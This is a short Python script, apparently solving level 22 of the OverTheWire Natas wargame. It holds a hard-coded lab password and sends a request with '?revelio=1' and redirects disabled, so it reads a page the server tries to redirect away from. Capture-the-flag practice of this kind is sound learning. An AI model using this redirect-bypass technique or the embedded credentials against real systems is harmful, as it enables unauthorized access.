import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string


natasURL = 'http://natas22.natas.labs.overthewire.org/'

natas_usr   = 'natas22'
natas_pword = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
login=(natas_usr,natas_pword)


# cookie = {"PHPSESSID":"testing"}
r = requests.post(url=natasURL + '?revelio=1' , auth=login, allow_redirects=False)

print(r.text)



